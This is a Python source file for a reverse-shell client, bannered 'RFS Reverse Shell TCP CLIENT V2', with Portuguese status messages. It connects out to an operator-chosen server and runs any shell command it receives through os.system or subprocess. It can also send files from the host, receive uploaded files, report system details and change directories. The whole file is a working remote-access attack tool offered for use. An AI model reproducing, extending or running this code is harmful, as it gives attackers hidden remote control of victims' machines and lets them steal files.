import socket,subprocess,os,sys, threading,platform

def banner():
   print('#######################################################################################################\n\n')
   print('RFS Reverse Shell TCP CLIENT V2')
   print('#######################################################################################################\n')

               
def download(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()      
    else: 
        s.send('Unable to find out the file')
   
def Cat(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()
    else:
        s.send('Unable to find out the file')
        
def mandaArq(s,bits):
    arq = "client_file.py"
    f = open(arq,'wb')
    while True:  
        bits = s.recv(1024)
        if 'Unable to find out the file' in bits:
            print ('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            s.send(' Upload Completo ')
            f.close()
            break
        f.write(bits)

def connect():
    ip = raw_input("[+]Server Ip: ")
    port = int(raw_input("[+]Port: "))
    try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip,port))
     while True:
        command = ""
        command = s.recv(4096)
      
        if('quit' in command):
            s.close()
            break
         
        elif 'pwd' in command:
           s.send(str(os.getcwd()))
           
        elif 'shell' in command:
           command = command[6:]
           os.system(command)
           s.send("[+]Comando %s executado com sucesso..."%command)
           
        elif 'sys' in command:
           v = " [+]Hostname: %s \n [+]System: %s \n [+]Release: %s \n [+]Machine: %s \n [+]Processor: %s "%(socket.gethostname(),platform.system(),platform.release(),platform.machine(), platform.processor())
           s.send(v)
            
        elif 'direc' in command:
           s.send(str(os.listdir(os.getcwd())))
        
        elif 'cd' in command:
            dirc = command[3:]
            if os.path.isdir(dirc):
                os.chdir(dirc)
                s.send(str(os.getcwd()))
            else:
                s.send('[+]Diretorio inexistente: %s'%dirc)

        elif 'mkdir' in command:
            dirc = command[6:]
            if os.path.isdir(dirc):
               command = '[+]Diretorio existente => %s'%dirc
               s.send(command)
            else:
               os.mkdir(dirc)
               s.send('[+]Diretorio %s feito com sucesso'%dirc)

        elif 'upload' in command:
            try:
                sended = command[7:]
                mandaArq(s,sended)
            except Exception as e:
                print("ERROR CLIENT %s" %str(e))
       
        elif 'rmdir' in command:
            dirc = command[6:]
            if os.path.isdir(dirc):
                os.rmdir(dirc)
                s.send('[+]Diretorio %s removido com sucesso'%dirc)
               
            else:
                s.send('[-]Diretorio %s inexistente'%dirc)
        
        elif('input' in command):
            print("[server]: "+command[6:])
            s.send('[client] diz: '+raw_input('[client]msg: '))

        elif('cat' in command):
            arq = command[4:]
            Cat(s,arq)

        elif 'download' in command:
            path = command[len('download')+1:]
            try:
                download(s,path)
            except Exception as e:
               s.send("[-]Client error: %s"%str(e))  
               pass
        else:
          try:
             cmd = subprocess.Popen(command,shell = True, stdin=subprocess.PIPE,stdout = subprocess.PIPE, stderr = subprocess.PIPE)
             s.send(cmd.stdout.read())
             s.send(cmd.stderr.read())

          except Exception as e:
             s.send("[-][Client]Erro ao enviar o comando:\n %s "%str(e))
       
            
    except Exception as e:
       print('[-][Client] Erro ao se conectar \n %s'%e)

def main():
    server_handler =  threading.Thread(target=connect, args=())
    server_handler.start()
    
try:
    banner()
    main()
except:
    print('[-] Erro ao abrir o client')
    main()
